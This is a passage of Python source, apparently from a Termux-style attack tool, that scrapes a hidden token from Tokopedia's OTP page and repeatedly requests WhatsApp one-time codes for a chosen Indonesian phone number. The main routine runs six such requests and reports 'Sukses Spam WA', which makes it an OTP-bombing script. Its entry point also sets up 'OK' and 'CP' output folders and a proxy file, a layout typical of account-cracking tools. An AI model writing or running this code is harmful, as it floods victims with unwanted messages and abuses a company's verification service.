		site = self.req.get("https://accounts.tokopedia.com/otp/c/page?otp_type=116&msisdn="+ no +"&ld=https%3A%2F%2Faccounts.tokopedia.com%2Fregister%3Ftype%3Dphone%26phone%3D{}%26status%3DeyJrIjp0cnVlLCJtIjp0cnVlLCJzIjpmYWxzZSwiYm90IjpmYWxzZSwiZ2MiOmZhbHNlfQ%253D%253D", headers = headers).text
		search = re.search(r'\<input\ id\=\"Token\"\ value\=\"(.*?)\"\ type\=\"hidden\"\>', site).group(1)
		data = {
			 "otp_type": "116",
			 "msisdn": no,
			 "tk": search,
			 "email": "",
			 "original_param": "",
			 "user_id": "",
			 "signature": "",
			 "number_otp_digit": "6",
			}
		__req__ = self.req.post(
				"https://accounts.tokopedia.com/otp/c/ajax/request-wa", headers = headers, data = data
	   ).text

	def main(self):
		self.wa_otp_1(nomor)
		self.wa_otp_2(nomor)
		self.wa_otp_3(nomor)
		self.wa_otp_4(nomor)
		self.wa_otp_5(nomor)
		self.wa_otp_6(nomor)
		cetak(panel(f" Sukses Spam WA Ke No : +62{nomor}",width=90,padding=(0,2),style=f"bold white"))

#-----------------------[ SYSTEM-CONTROL ]--------------------#
if __name__=='__main__':
	try:os.system('git pull')
	except:pass
	try:os.mkdir('OK')
	except:pass
	try:os.mkdir('CP')
	except:pass
	try:os.mkdir('/sdcard/DUMP-FILE')
	except:pass
	try:os.system('touch .prox.txt')
	except:pass
	try:os.system('clear')
	except:pass
	login()